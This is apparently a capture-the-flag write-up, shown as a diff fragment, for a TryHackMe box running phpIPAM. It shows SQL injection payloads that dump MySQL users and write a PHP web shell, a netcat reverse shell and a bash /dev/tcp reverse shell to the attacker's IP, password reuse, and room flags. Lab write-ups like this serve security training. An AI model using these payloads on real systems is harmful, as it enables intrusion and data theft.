@@ -326,3 +326,332 @@ exploit(url, auth_cookie, path, command)
 █▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄
 
 █▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
+█▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄
+
+[...] Trying to log in as admin
+[+] Login successful!
+[...] Exploiting
+[+] Success! The shell is located at http://10.10.133.68/evil.php. Parameter: cmd
+
+[+] Output:
+1	 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+ 	3	4
+
+phpIPAM es una herramienta de administración de direcciones IP (IPAM) de código abierto basada en la web. Permite a los administradores de red gestionar sus direcciones IP y subredes de manera eficiente, lo que resulta muy útil en redes grandes y complejas.
+
+phpIPAM es una herramienta bastante completa que incluye muchas funciones útiles, como la gestión de direcciones IP, subredes y VLAN, el descubrimiento automático de dispositivos de red, la generación automática de informes, la integración con herramientas de terceros, la autenticación basada en roles y permisos, entre otros.
+
+Aunque puede haber cierta curva de aprendizaje para usuarios nuevos en la herramienta, phpIPAM se considera relativamente simple en comparación con otras soluciones de IPAM más complejas y costosas. Además, su naturaleza de código abierto lo hace altamente personalizable y adaptable a las necesidades de cada organización.
+
+## Proof of Concept
+
+Steps to reproduce
+
+1.  Go to settings and enable the routing module.
+2.  Go to show routing.
+3.  Click on "Add peer" and create a new "BGP peer".
+4.  Click on the newly created "BGP peer".
+5.  Click on "Actions" and go to "Subnet Mapping".
+6.  Scroll down to "Map new subnet".
+7.  Insert an SQL Injection sentence inside the search parameter, for example: `" union select @@version,2,user(),4 -- -`.
+
+" union select @@version,2,user(),4 -- -
+
+	8.0.28-0ubuntu0.20.04.3/phpipam_ollie@localhost (4)	
+
+" union all select 1,2,3,group_concat(user,0x3a,file_priv) from mysql.user -- -
+
+1/3 (debian-sys-maint:Y,mysql.infoschema:N,mysql.session:N,mysql.sys:N,ollie_mysql:Y,phpipam_ollie:Y,root:Y)
+
+The query uses the "union all" command to combine the result sets from two separate queries into one. The first query returns the values 1, 2, and 3, which are not particularly relevant to the attack. The second query uses the "group_concat" function to concatenate the "user" and "file_priv" fields from the "mysql.user" table, separated by a colon (represented by the hex value "0x3a"). The "-- -" characters at the end of the query are used to comment out the remaining portion of the original query, preventing any errors.
+
+In summary, this attack query aims to extract information about the users and file privileges in the MySQL database, by exploiting a vulnerability that allows an attacker to inject malicious SQL code into an application's input fields. It is important to note that SQL injection attacks can be very dangerous and can result in unauthorized access to sensitive data, modification or deletion of data, or even complete system compromise.
+
+`phpipam_ollie` is able to write a file!
+
+"<?php system($_GET["cmd"]); ?>"
+to hex
+
+" Union Select 1,0x223c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e22,3,4 INTO OUTFILE '/var/www/html/shell.php' -- -
+
+┌──(witty㉿kali)-[~/bug_hunter/svn-extractor]
+└─$ curl http://10.10.49.94/shell.php\?cmd\=whoami   
+1	"www-data
+"	3	4
+
+revshell
+
+https://www.revshells.com/
+
+┌──(witty㉿kali)-[~/bug_hunter/svn-extractor]
+└─$ curl http://10.10.49.94/shell.php\?cmd\=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.8.19.103%204443%20%3E%2Ftmp%2Ff
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 4443
+listening on [any] 4443 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.49.94] 40914
+sh: 0: can't access tty; job control turned off
+```
+```text
+$ whoami
+www-data
+```
+
+## Privilege Escalation
+```text
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@hackerdog:/var/www/html$ ls
+ls
+INSTALL.txt  app		db		  index.php  robots.txt
+README.md    config.docker.php	functions	  install    shell.php
+UPDATE	     config.php		imgs		  js	     upgrade
+api	     css		immaolllieeboyyy  misc
+
+www-data@hackerdog:/var/www/html$ cat robots.txt
+cat robots.txt
+User-agent: *
+Disallow: /
+Disallow: /immaolllieeboyyy
+www-data@hackerdog:/var/www/html$ cd /home
+cd /home
+www-data@hackerdog:/home$ ls
+ls
+ollie
+www-data@hackerdog:/home$ cd ollie
+cd ollie
+www-data@hackerdog:/home/ollie$ ls
+ls
+user.txt
+www-data@hackerdog:/home/ollie$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+
+Password Reuse attack!
+
+www-data@hackerdog:/home/ollie$ su ollie
+su ollie
+Password: OllieUnixMontgomery!
+
+ollie@hackerdog:~$ cat user.txt
+cat user.txt
+THM{Ollie_boi_is_daH_Cut3st}
+
+ollie@hackerdog:~$ sudo -l
+sudo -l
+[sudo] password for ollie: OllieUnixMontgomery!
+
+Sorry, user ollie may not run sudo on hackerdog.
+
+ollie@hackerdog:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
+find / -perm -4000 2>/dev/null | xargs ls -lah
+-rwsr-xr-x 1 root   root             43K Sep 16  2020 /snap/core18/2128/bin/mount
+-rwsr-xr-x 1 root   root             63K Jun 28  2019 /snap/core18/2128/bin/ping
+-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/2128/bin/su
+-rwsr-xr-x 1 root   root             27K Sep 16  2020 /snap/core18/2128/bin/umount
+-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/2128/usr/bin/chfn
+-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/2128/usr/bin/chsh
+-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/2128/usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             40K Mar 22  2019 /snap/core18/2128/usr/bin/newgrp
+-rwsr-xr-x 1 root   root             59K Mar 22  2019 /snap/core18/2128/usr/bin/passwd
+-rwsr-xr-x 1 root   root            146K Jan 19  2021 /snap/core18/2128/usr/bin/sudo
+-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root            427K Mar  4  2019 /snap/core18/2128/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root             43K Sep 16  2020 /snap/core18/2284/bin/mount
+-rwsr-xr-x 1 root   root             63K Jun 28  2019 /snap/core18/2284/bin/ping
+-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/2284/bin/su
+-rwsr-xr-x 1 root   root             27K Sep 16  2020 /snap/core18/2284/bin/umount
+-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/2284/usr/bin/chfn
+-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/2284/usr/bin/chsh
+-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/2284/usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             40K Mar 22  2019 /snap/core18/2284/usr/bin/newgrp
+-rwsr-xr-x 1 root   root             59K Mar 22  2019 /snap/core18/2284/usr/bin/passwd
+-rwsr-xr-x 1 root   root            146K Jan 19  2021 /snap/core18/2284/usr/bin/sudo
+-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core18/2284/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root            427K Aug 11  2021 /snap/core18/2284/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root             84K Jul 14  2021 /snap/core20/1328/usr/bin/chfn
+-rwsr-xr-x 1 root   root             52K Jul 14  2021 /snap/core20/1328/usr/bin/chsh
+-rwsr-xr-x 1 root   root             87K Jul 14  2021 /snap/core20/1328/usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             55K Jul 21  2020 /snap/core20/1328/usr/bin/mount
+-rwsr-xr-x 1 root   root             44K Jul 14  2021 /snap/core20/1328/usr/bin/newgrp
+-rwsr-xr-x 1 root   root             67K Jul 14  2021 /snap/core20/1328/usr/bin/passwd
+-rwsr-xr-x 1 root   root             67K Jul 21  2020 /snap/core20/1328/usr/bin/su
+-rwsr-xr-x 1 root   root            163K Jan 19  2021 /snap/core20/1328/usr/bin/sudo
+-rwsr-xr-x 1 root   root             39K Jul 21  2020 /snap/core20/1328/usr/bin/umount
+-rwsr-xr-- 1 root   systemd-resolve  51K Jun 11  2020 /snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root            463K Dec  2  2021 /snap/core20/1328/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root            109K Jul 14  2021 /snap/snapd/12704/usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root   root            121K Jan  7  2022 /snap/snapd/14549/usr/lib/snapd/snap-confine
+-rwsr-sr-x 1 daemon daemon           55K Nov 12  2018 /usr/bin/at
+-rwsr-xr-x 1 root   root             84K Jul 14  2021 /usr/bin/chfn
+-rwsr-xr-x 1 root   root             52K Jul 14  2021 /usr/bin/chsh
+-rwsr-xr-x 1 root   root             39K Mar  7  2020 /usr/bin/fusermount
+-rwsr-xr-x 1 root   root             87K Jul 14  2021 /usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             55K Feb  7  2022 /usr/bin/mount
+-rwsr-xr-x 1 root   root             44K Jul 14  2021 /usr/bin/newgrp
+-rwsr-xr-x 1 root   root             67K Jul 14  2021 /usr/bin/passwd
+-rwsr-xr-x 1 root   root             31K Jan 12  2022 /usr/bin/pkexec
+-rwsr-xr-x 1 root   root             67K Feb  7  2022 /usr/bin/su
+-rwsr-xr-x 1 root   root            163K Jan 19  2021 /usr/bin/sudo
+-rwsr-xr-x 1 root   root             39K Feb  7  2022 /usr/bin/umount
+-rwsr-xr-- 1 root   messagebus       51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root             15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root   root            463K Dec  2  2021 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root             23K Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root   root            128K Sep  9  2021 /usr/lib/snapd/snap-confine
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 7070
+Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...
+10.10.49.94 - - [24/Feb/2023 15:48:53] "GET /pspy64 HTTP/1.1" 200 -
+
+ollie@hackerdog:/$ cd /tmp
+cd /tmp
+ollie@hackerdog:/tmp$ wget http://10.8.19.103:7070/pspy64
+wget http://10.8.19.103:7070/pspy64
+--2023-02-24 20:51:39--  http://10.8.19.103:7070/pspy64
+Connecting to 10.8.19.103:7070... connected.
+HTTP request sent, awaiting response... 200 OK
+
+ollie@hackerdog:/tmp$ chmod +x pspy64
+chmod +x pspy64
+ollie@hackerdog:/tmp$ ./pspy64
+
+ollie@hackerdog:/tmp$ ./pspy64
+./pspy64
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2023/02/24 20:55:09 CMD: UID=0     PID=2333   | /lib/systemd/systemd-udevd 
+2023/02/24 20:55:09 CMD: UID=0     PID=2332   | /bin/bash /usr/bin/feedme 
+www-data@hackerdog:/tmp$ ls -la /usr/bin/feedme
+ls -la /usr/bin/feedme
+-rwxrw-r-- 1 root ollie 30 Feb 12  2022 /usr/bin/feedme
+www-data@hackerdog:/tmp$ cat /usr/bin/feedme
+cat /usr/bin/feedme
+#!/bin/bash
+```
+```text
+# This is weird?
+ollie@hackerdog:/tmp$ echo "/bin/bash -i >& /dev/tcp/10.8.19.103/1337 0>&1" >> /usr/bin/feedme
+< /dev/tcp/10.8.19.103/1337 0>&1" >> /usr/bin/feedme
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.49.94] 51564
+bash: cannot set terminal process group (2462): Inappropriate ioctl for device
+bash: no job control in this shell
+root@hackerdog:/# cd /root
+cd /root
+root@hackerdog:~# ls
+ls
+root.txt
+snap
+root@hackerdog:~# cat root.txt
+cat root.txt
+THM{Ollie_Luvs_Chicken_Fries}
+
+root@hackerdog:/var/www/html# docker ps
+docker ps
+CONTAINER ID   IMAGE      COMMAND                  CREATED         STATUS          PORTS                                       NAMES
+a1a0f8014a1c   olliebot   "python3 -u olliebot…"   12 months ago   Up 39 minutes   0.0.0.0:1337->1337/tcp, :::1337->1337/tcp   olliebot
+
+root@hackerdog:/var/www/html# python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+root@hackerdog:/var/www/html# docker exec -it a1a0f8014a1c sh
+docker exec -it a1a0f8014a1c sh
+/ # 55R5R
+5R5R
+sh: 5R5R: not found
+/ # 55R5Rwhoami
+5R5Rwhoami
+/ # lls
+ls
+app          home         olliebot.py  run          tmp
+bin          lib          opt          sbin         usr
+dev          media        proc         srv          var
+etc          mnt          root         sys
+/ # ccat olliebot.py
+cat olliebot.py
+import sys
+import threading
+import socket
+from time import sleep
+
+#make this run on startup  WIP
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind(('0.0.0.0', 1337))
+s.listen()
+
+def catch(c, a):
+    c.send(b"Hey stranger, I\'m Ollie, protector of panels, lover of deer antlers.\n\nWhat is your name? ")
+    user = c.recv(1024).decode("utf-8").strip("\n")
+    c.send(f'What\'s up, {user.capitalize()}! It\'s been a while. What are you here for? '.encode("utf-8"))
+    what = c.recv(1024).decode("utf-8").strip("\n")
+    if 'food' in what.lower():
+        c.send(b'I am hungry, I need food. You better be careful. I\'ve been known to bite. Moving on...\n')
+        sleep(1.5)
+        c.send(b'Ya know what... I have an idea. A question to test your knowledge about me...\n')
+        sleep(2)
+    else:
+        c.send(f'Ya\' know what? {user.capitalize()}. If you can answer a question about me, I might have something for you.\n'.encode("utf-8"))
+        sleep(1.5)
+
+    while True:
+        c.send(f'\n\nWhat breed of dog am I? I\'ll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? '.encode("utf-8"))
+        riddle = c.recv(1024).decode("utf-8").strip("\n")
+        if 'bulldog' not in riddle.lower():
+            c.send(b'You are wrong! I\'m sorry, but this is serious business. Let\'s try again...\n')
+        else:
+            c.send(b'You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...\nPlease hold on a minute\n')
+            sleep(2)
+            c.send(b'Ok, I\'m back.\nAfter a lengthy discussion, we\'ve come to the conclusion that you are the right person for the job.')
+            sleep(2)
+            c.send(b'''Here are the credentials for our administration panel.\n
+                    Username: admin\n
+                    Password: OllieUnixMontgomery!\n\n''')
+            sleep(1)
+            c.send(b'PS: Good luck and next time bring some treats!\n\n')
+            break
+
+    c.close()
+
+if __name__ == "__main__":
+    while True:
+        try:
+            c,a = s.accept()
+            thread = threading.Thread(target=lambda: catch(c,a))
+            thread.setDaemon(True)
+            thread.start()
+        except KeyboardInterrupt:
+            s.close()
+            exit()
+        except Exception:
+            continue
+```
+![[Pasted image 20230224131339.png]]
+What is the user.txt flag?
+Ollie doesn't give hints!
+What is the root.txt flag?
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e3595f110c4674ba9f80e7a/room-content/9e73c99868e94dfa12783f95a1af0178.jpg)
+- ***THM{Ollie_boi_is_daH_Cut3st}***
+- ***THM{Ollie_Luvs_Chicken_Fries}***
+
+## Notes / Lessons Learned
+[[Training for New Analyst]]
+
